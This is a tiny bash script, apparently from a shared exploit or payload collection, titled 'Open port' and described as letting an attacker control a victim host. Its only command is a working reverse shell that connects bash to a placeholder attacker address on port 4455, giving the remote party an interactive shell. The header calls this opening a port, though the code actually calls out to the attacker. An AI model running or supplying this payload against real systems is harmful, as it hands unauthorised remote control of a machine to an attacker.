# Title: Open port
# Description: Opening port for attacker to listen to control the victim host
# Author: Shakirulmuez
# Date: July 28, 2019

#!/bin/bash

bash -i >& /dev/tcp/<lhost_ip_address>/4455 0>&1